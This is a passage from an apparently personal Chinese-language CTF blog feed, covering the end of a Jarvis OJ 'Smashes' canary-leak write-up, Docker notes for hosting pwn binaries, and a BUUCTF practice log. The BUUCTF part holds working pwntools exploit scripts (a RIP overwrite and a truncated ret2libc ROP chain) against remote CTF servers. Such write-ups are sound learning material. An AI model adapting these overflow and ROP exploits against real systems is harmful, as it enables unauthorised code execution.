class="hljs-params">...</span><span class="hljs-params">...</span>.<br><br>Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x000000000040080e</span> <span class="hljs-keyword">in</span> ?? ()<br>gdb<span class="hljs-params">-peda</span>$ <span class="hljs-built_in">stack</span> <span class="hljs-number">50</span><br><span class="hljs-number">0000</span>| <span class="hljs-number">0x7fffffffdd20</span> --&gt; <span class="hljs-number">0x0</span> <br><br><span class="hljs-params">...</span><span class="hljs-params">...</span>..<br><br><span class="hljs-number">0328</span>| <span class="hljs-number">0x7fffffffde68</span> --&gt; <span class="hljs-number">0x7fffffffdf38</span> --&gt; <span class="hljs-number">0x7fffffffe2aa</span> (<span class="hljs-string">&quot;/home/r3teax/Jarvis OJ/PWN/Smashes/smashes&quot;</span>)<br><br><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br><br>gdb<span class="hljs-params">-peda</span>$ find CTF<br>Searching for <span class="hljs-string">&#x27;CTF&#x27;</span> <span class="hljs-keyword">in</span>: <span class="hljs-literal">None</span> ranges<br>Found <span class="hljs-number">2</span> results, display <span class="hljs-keyword">max</span> <span class="hljs-number">2</span> items:<br>smashes : <span class="hljs-number">0x400d21</span> (<span class="hljs-string">&quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;</span>)<br>smashes : <span class="hljs-number">0x600d21</span> (<span class="hljs-string">&quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;</span>)<br><br>gdb<span class="hljs-params">-peda</span>$ distance $rsp <span class="hljs-number">0x7fffffffdf38</span><br>From <span class="hljs-number">0x7fffffffdd20</span> <span class="hljs-keyword">to</span> <span class="hljs-number">0x7fffffffdf38</span>: <span class="hljs-number">536</span> <span class="hljs-built_in">bytes</span>, <span class="hljs-number">134</span> dwords<br>gdb<span class="hljs-params">-peda</span>$ p <span class="hljs-number">536</span><br>$<span class="hljs-number">4</span> = <span class="hljs-number">0x218</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vim">r3teax@ubuntu:~/Jarvis OJ/PWN/Smashes$ <span class="hljs-keyword">python</span> <span class="hljs-built_in">exp</span>.<span class="hljs-keyword">py</span> d<br>[*] <span class="hljs-string">&#x27;/home/r3teax/Jarvis OJ/PWN/Smashes/smashes&#x27;</span><br>    Arch:     amd64-<span class="hljs-number">64</span>-little<br>    RELRO:    No RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (<span class="hljs-number">0</span>x400000)<br>    FORTIFY:  Enabled<br>[+] Opening connection <span class="hljs-keyword">to</span> pwn.jarvisoj.<span class="hljs-keyword">com</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">9877</span>: Done<br>[*] Switching <span class="hljs-keyword">to</span> interactive <span class="hljs-keyword">mode</span><br>Nice <span class="hljs-keyword">to</span> meet you, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaaf @.<br>Please overwrite the fla<span class="hljs-variable">g:</span> $ <span class="hljs-keyword">ls</span><br>Thank you, bye!<br>*** stack smashing detected ***: PCTF&#123;<span class="hljs-number">57</span>dErr_Smasher_good_work!&#125; terminated<br>[*] Got EOF <span class="hljs-keyword">while</span> reading in interactive<br></code></pre></td></tr></table></figure><p><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/02/21/Docker_note/"/>
    <url>/2022/02/21/Docker_note/</url>
    
    <content type="html"><![CDATA[<p>docker</p><p>参考： <a href="https://www.cnblogs.com/cocowool/p/make_your_own_base_docker_image.html">https://www.cnblogs.com/cocowool/p/make_your_own_base_docker_image.html</a> </p><p> <a href="https://docs.docker.com/develop/develop-images/baseimages/#create-a-full-image-using-tar">https://docs.docker.com/develop/develop-images/baseimages/#create-a-full-image-using-tar</a> </p><p> <a href="https://blog.csdn.net/AnY11/article/details/89563205">https://blog.csdn.net/AnY11/article/details/89563205</a> </p><p>Linux下使用单个可执行文件创建基础镜像，以下为 Dockerfile </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> scratch<br><span class="hljs-keyword">ADD</span><span class="bash"> pwn1 /</span><br><span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;/pwn1&quot;</span>]</span><br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">root@ubuntu /h/r/H/L/lab3# docker login<br>Login <span class="hljs-keyword">with</span> your Docker ID <span class="hljs-keyword">to</span> push <span class="hljs-keyword">and</span> pull images from Docker Hub. <span class="hljs-keyword">If</span> you don<span class="hljs-symbol">&#x27;t</span> have a Docker ID, head over <span class="hljs-keyword">to</span> https://hub.docker.com <span class="hljs-keyword">to</span> create one.<br>Username: reteax<br>Password: <br><span class="hljs-literal">WARNING</span>! Your password will be stored unencrypted <span class="hljs-keyword">in</span> /root/.docker/config.json.<br>Configure a credential helper <span class="hljs-keyword">to</span> remove this <span class="hljs-literal">warning</span>. See<br>https://docs.docker.com/engine/reference/commandline/login/#credentials-store<br><br>Login Succeeded<br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ada">root@ubuntu /h/r/H/L/lab3# docker build -t pwn:<span class="hljs-number">0.1</span> .<br>Sending build context to Docker daemon  <span class="hljs-number">24.58</span>kB<br>Step <span class="hljs-number">1</span>/<span class="hljs-number">3</span> : <span class="hljs-type">FROM</span> scratch<br> <span class="hljs-comment">---&gt; </span><br>Step <span class="hljs-number">2</span>/<span class="hljs-number">3</span> : <span class="hljs-type">ADD</span> pwn1 /<br> <span class="hljs-comment">---&gt; 41e1a1f74752</span><br>Step <span class="hljs-number">3</span>/<span class="hljs-number">3</span> : <span class="hljs-type">CMD</span> [<span class="hljs-string">&quot;/pwn1&quot;</span>]<br> <span class="hljs-comment">---&gt; Running in ae2f734542b6</span><br>Removing intermediate container ae2f734542b6<br> <span class="hljs-comment">---&gt; 90a098f10c47</span><br>Successfully built <span class="hljs-number">90</span>a098f10c47<br>Successfully <span class="hljs-keyword">tagged</span> pwn:<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@ubuntu /h/r/H/L/lab<span class="hljs-number">3</span># docker images<br><span class="hljs-attribute">REPOSITORY</span>          TAG                 IMAGE ID            CREATED             SIZE<br><span class="hljs-attribute">pwn</span>                 <span class="hljs-number">0</span>.<span class="hljs-number">1</span>                 <span class="hljs-number">90</span>a<span class="hljs-number">098</span>f<span class="hljs-number">10</span>c<span class="hljs-number">47</span>        <span class="hljs-number">17</span> seconds ago      <span class="hljs-number">7</span>.<span class="hljs-number">5</span>kB<br><span class="hljs-attribute">ctfwiki</span>/ctf-wiki    latest              b<span class="hljs-number">7</span>d<span class="hljs-number">6</span>a<span class="hljs-number">0268941</span>        <span class="hljs-number">3</span> weeks ago         <span class="hljs-number">180</span>MB<br><span class="hljs-attribute">demo</span>                latest              <span class="hljs-number">8</span>e<span class="hljs-number">44</span>f<span class="hljs-number">69615</span>b<span class="hljs-number">2</span>        <span class="hljs-number">5</span> weeks ago         <span class="hljs-number">350</span>MB<br><span class="hljs-attribute">ubuntu</span>              <span class="hljs-number">16</span>.<span class="hljs-number">04</span>               b<span class="hljs-number">9409899</span>fe<span class="hljs-number">86</span>        <span class="hljs-number">5</span> weeks ago       <br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@ubuntu /h/r/H/L/lab<span class="hljs-number">3</span># docker tag pwn:<span class="hljs-number">0</span>.<span class="hljs-number">1</span> reteax/pwn:<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">root</span>@ubuntu /h/r/H/L/lab<span class="hljs-number">3</span># docker images<br><span class="hljs-attribute">REPOSITORY</span>          TAG                 IMAGE ID            CREATED             SIZE<br><span class="hljs-attribute">reteax</span>/pwn          <span class="hljs-number">0</span>.<span class="hljs-number">1</span>                 <span class="hljs-number">90</span>a<span class="hljs-number">098</span>f<span class="hljs-number">10</span>c<span class="hljs-number">47</span>        <span class="hljs-number">10</span> minutes ago      <span class="hljs-number">7</span>.<span class="hljs-number">5</span>kB<br><span class="hljs-attribute">pwn</span>                 <span class="hljs-number">0</span>.<span class="hljs-number">1</span>                 <span class="hljs-number">90</span>a<span class="hljs-number">098</span>f<span class="hljs-number">10</span>c<span class="hljs-number">47</span>        <span class="hljs-number">10</span> minutes ago      <span class="hljs-number">7</span>.<span class="hljs-number">5</span>kB<br><span class="hljs-attribute">ctfwiki</span>/ctf-wiki    latest              b<span class="hljs-number">7</span>d<span class="hljs-number">6</span>a<span class="hljs-number">0268941</span>        <span class="hljs-number">3</span> weeks ago         <span class="hljs-number">180</span>MB<br><span class="hljs-attribute">demo</span>                latest              <span class="hljs-number">8</span>e<span class="hljs-number">44</span>f<span class="hljs-number">69615</span>b<span class="hljs-number">2</span>        <span class="hljs-number">5</span> weeks ago         <span class="hljs-number">350</span>MB<br><span class="hljs-attribute">ubuntu</span>              <span class="hljs-number">16</span>.<span class="hljs-number">04</span>               b<span class="hljs-number">9409899</span>fe<span class="hljs-number">86</span>        <span class="hljs-number">5</span> weeks ago         <span class="hljs-number">122</span>MB<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@ubuntu /h/r/H/L/lab<span class="hljs-number">3</span># docker push reteax/pwn:<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">The</span> push refers to repository<span class="hljs-meta"> [docker.io/reteax/pwn]</span><br><span class="hljs-attribute">3113a8ac9667</span>: Pushed <br><span class="hljs-attribute">0</span>.<span class="hljs-number">1</span>: digest: sha<span class="hljs-number">256</span>:<span class="hljs-number">0</span>f<span class="hljs-number">89</span>ca<span class="hljs-number">0</span>dd<span class="hljs-number">497</span>f<span class="hljs-number">25</span>e<span class="hljs-number">89</span>fabd<span class="hljs-number">5</span>a<span class="hljs-number">5</span>fa<span class="hljs-number">76</span>bc<span class="hljs-number">9</span>fc<span class="hljs-number">4</span>d<span class="hljs-number">33</span>c<span class="hljs-number">47665</span>c<span class="hljs-number">57476</span>c<span class="hljs-number">6</span>a<span class="hljs-number">68183</span>dfc<span class="hljs-number">9</span>b<span class="hljs-number">2</span> size: <span class="hljs-number">525</span><br></code></pre></td></tr></table></figure><h1 id="Docker删除镜像和容器"><a href="#Docker删除镜像和容器" class="headerlink" title="Docker删除镜像和容器"></a>Docker删除镜像和容器</h1><p>删除docker中的镜像，我们可以使用如下命令：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker rmi 镜像<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>删除docker中的容器可以使用如下命令：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker rm 容器<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>使用如下命令可以查看当前正在运行的容器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span><br></code></pre></td></tr></table></figure><p>对于已退出的容器，可以使用如下命令进行查看：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker ps -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><h2 id="Docker-清理命令"><a href="#Docker-清理命令" class="headerlink" title="Docker 清理命令"></a>Docker 清理命令</h2><p>杀死所有正在运行的容器</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker kill <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">a</span> -<span class="hljs-params">q</span>)</span><br></code></pre></td></tr></table></figure><p>删除所有已经停止的容器</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker rm <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">a</span> -<span class="hljs-params">q</span>)</span><br></code></pre></td></tr></table></figure><p>删除所有未打 dangling 标签的镜像</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker rmi <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">images</span> -<span class="hljs-params">q</span> -<span class="hljs-params">f</span> <span class="hljs-params">dangling</span>=<span class="hljs-params">true</span>)</span><br></code></pre></td></tr></table></figure><p>通过镜像的id来删除指定镜像</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker rmi &lt;image <span class="hljs-built_in">id</span>&gt;<br></code></pre></td></tr></table></figure><p>删除所有镜像</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker rmi <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">images</span> -<span class="hljs-params">q</span>)</span><br></code></pre></td></tr></table></figure><p>为这些命令创建别名</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"># ~/.bash_aliases<br><br># 杀死所有正在运行的容器.<br>alias dockerkill=&#x27;docker kill <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">a</span> -<span class="hljs-params">q</span>)</span>&#x27;<br><br># 删除所有已经停止的容器.<br>alias dockercleanc=&#x27;docker rm <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">a</span> -<span class="hljs-params">q</span>)</span>&#x27;<br><br># 删除所有未打标签的镜像.<br>alias dockercleani=&#x27;docker rmi <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">images</span> -<span class="hljs-params">q</span> -<span class="hljs-params">f</span> <span class="hljs-params">dangling</span>=<span class="hljs-params">true</span>)</span>&#x27;<br><br># 删除所有已经停止的容器和未打标签的镜像.<br>alias dockerclean=&#x27;dockercleanc<span class="hljs-operator"> || </span><span class="hljs-literal">true</span><span class="hljs-operator"> &amp;&amp; </span>dockercleani&#x27;<br></code></pre></td></tr></table></figure><h1 id="Pwndocker"><a href="#Pwndocker" class="headerlink" title="Pwndocker"></a>Pwndocker</h1><p><a href="https://github.com/0xTac/Pwndocker">https://github.com/0xTac/Pwndocker</a></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">docker run -it -v -v <span class="hljs-variable">$(</span>pwd)/<span class="hljs-variable">$&#123;</span>ctf_name&#125;<span class="hljs-symbol">:/ctf/work</span> -p <span class="hljs-number">23946</span><span class="hljs-symbol">:</span><span class="hljs-number">23946</span> --privileged --cap-add=SYS_PRTACE pwndocker<br></code></pre></td></tr></table></figure><p>-v 是 volume 就是数据卷，就是指定，[宿主机文件夹：容器内文件夹]，就是把宿主机的文件夹挂载到容器的文件夹。</p><p>$(pwd)就是当前工作目录。</p><p>本命令显示整个路径名，Print Working Directory的意思；</p><p>我的设置</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">docker run -it -d --rm -h revo --name revo -v <span class="hljs-variable">$(</span>pwd)<span class="hljs-symbol">:/ctf/work</span> -p <span class="hljs-number">23946</span><span class="hljs-symbol">:</span><span class="hljs-number">23946</span> --privileged --cap-add=SYS_PTRACE pwndocker<br>docker exec -it revo /bin/bash<br><br><span class="hljs-comment">#https://github.com/skysider/pwndocker</span><br>docker run -d --rm -h mypwn --name mypwn -v <span class="hljs-variable">$(</span>pwd)<span class="hljs-symbol">:/ctf/work</span> -p <span class="hljs-number">23946</span><span class="hljs-symbol">:</span><span class="hljs-number">23946</span> --cap-add=SYS_PTRACE skysider/pwndocker<br></code></pre></td></tr></table></figure><h1 id="Docker-run-命令"><a href="#Docker-run-命令" class="headerlink" title="Docker run 命令"></a>Docker run 命令</h1><p><strong>docker run ：</strong>创建一个新的容器并运行一个命令</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker run <span class="hljs-selector-attr">[OPTIONS]</span> IMAGE <span class="hljs-selector-attr">[COMMAND]</span> <span class="hljs-selector-attr">[ARG...]</span><br></code></pre></td></tr></table></figure><p>OPTIONS说明：</p><ul><li><strong>-a stdin:</strong> 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</li><li><strong>-d:</strong> 后台运行容器，并返回容器ID；</li><li><strong>-i:</strong> 以交互模式运行容器，通常与 -t 同时使用；</li><li><strong>-P:</strong> 随机端口映射，容器内部端口<strong>随机</strong>映射到主机的端口</li><li><strong>-p:</strong> 指定端口映射，格式为：<strong>主机(宿主)端口:容器端口</strong></li><li><strong>-t:</strong> 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</li><li><strong>–name=”nginx-lb”:</strong> 为容器指定一个名称；</li><li><strong>–dns 8.8.8.8:</strong> 指定容器使用的DNS服务器，默认和宿主一致；</li><li><strong>–dns-search example.com:</strong> 指定容器DNS搜索域名，默认和宿主一致；</li><li><strong>-h “mars”:</strong> 指定容器的hostname；</li><li><strong>-e username=”ritchie”:</strong> 设置环境变量；</li><li><strong>–env-file=[]:</strong> 从指定文件读入环境变量；</li><li><strong>–cpuset=”0-2” or –cpuset=”0,1,2”:</strong> 绑定容器到指定CPU运行；</li><li>**-m :**设置容器使用内存最大值；</li><li><strong>–net=”bridge”:</strong> 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</li><li><strong>–link=[]:</strong> 添加链接到另一个容器；</li><li><strong>–expose=[]:</strong> 开放一个端口或一组端口；</li><li><strong>–volume , -v:</strong> 绑定一个卷</li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>使用docker镜像nginx:latest以后台模式启动一个容器,并将容器命名为mynginx。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker <span class="hljs-built_in">run</span> <span class="hljs-comment">--name mynginx -d nginx:latest</span><br></code></pre></td></tr></table></figure><p>使用镜像nginx:latest以后台模式启动一个容器,并将容器的80端口映射到主机随机端口。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-builtin-name">run</span> -P -d nginx:latest<br></code></pre></td></tr></table></figure><p>使用镜像 nginx:latest，以后台模式启动一个容器,将容器的 80 端口映射到主机的 80 端口,主机的目录 /data 映射到容器的 /data。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">docker</span> run -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> -v /<span class="hljs-class"><span class="hljs-keyword">data</span>:/<span class="hljs-keyword">data</span> -d nginx:latest</span><br></code></pre></td></tr></table></figure><p>绑定容器的 8080 端口，并将其映射到本地主机 127.0.0.1 的 80 端口上。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-builtin-name">run</span> -p 127.0.0.1:80:8080/tcp ubuntu bash<br></code></pre></td></tr></table></figure><p>使用镜像nginx:latest以交互模式启动一个容器,在容器内执行/bin/bash命令。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">runoob<span class="hljs-variable">@runoob</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>docker run -it <span class="hljs-symbol">nginx:</span>latest /bin/bash<br>root<span class="hljs-variable">@b8573233d675</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/02/21/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/02/21/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="RIP覆盖一下"><a href="#RIP覆盖一下" class="headerlink" title="RIP覆盖一下"></a>RIP覆盖一下</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>   <span class="hljs-comment">#显示调试的信息</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]   <span class="hljs-comment">#？</span><br><br>local = <span class="hljs-number">0</span>  <span class="hljs-comment">#设置是本地还是远程渗透</span><br><br><span class="hljs-keyword">if</span> local:<br>    p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>    <span class="hljs-comment">#bin = ELF(&#x27;./&#x27;,checksec=False)</span><br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br><span class="hljs-keyword">else</span>:<br>    p=remote(<span class="hljs-string">&#x27;pwn.buuoj.cn&#x27;</span>,<span class="hljs-number">6001</span>)<br>    <span class="hljs-comment">#bin = ELF(&#x27;./&#x27;,checksec=False)</span><br>    <span class="hljs-comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;,checksec=False)</span><br>    <span class="hljs-keyword">pass</span><br><br>bin_sh_addr = <span class="hljs-number">0x0401186</span><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">23</span> + p64(bin_sh_addr)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choose2</span>():</span><br><span class="hljs-comment">#p.recvuntil(&quot;please input\n&quot;)  这个在一般情况是需要添加的  可是这个题不知道为什么添加就不执行shell了</span><br>p.sendline(payload)<br><br><span class="hljs-comment">#raw_input()  用来断在开始的位置</span><br><span class="hljs-comment">#gdb.attach(p)  可以用动态调试</span><br><br>p.interactive()<br><br><br>choose2()<br><br>或者<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;buuoj.cn&#x27;</span>,<span class="hljs-number">6001</span>)<br>system=<span class="hljs-number">0x401186</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">23</span>+p64(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import LibcSearcher<br><br><span class="hljs-attribute">sh</span>=remote(&#x27;pwn.buuoj.cn&#x27;,20115)<br><span class="hljs-attribute">ciscn</span>=ELF(&#x27;/home/harmonica/Desktop/ciscn_2019_c_1.dms&#x27;)<br><span class="hljs-attribute">libc</span>=ELF(&#x27;/home/r3teax/Desktop/x64_libc.so.6&#x27;)<br><br>def send(content):<br>    sh.recvuntil(<span class="hljs-string">&#x27;Input your choice!\n&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)<br>    sh.sendline(content)<br><br><span class="hljs-attribute">puts_plt</span>=ciscn.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_got</span>=ciscn.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">main</span>=ciscn.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-attribute">pop_rdi</span>=0x400c83<br><br>payload =<span class="hljs-string">&#x27;A&#x27;</span> * 0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>send(payload)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;@\n&#x27;</span>)<br><span 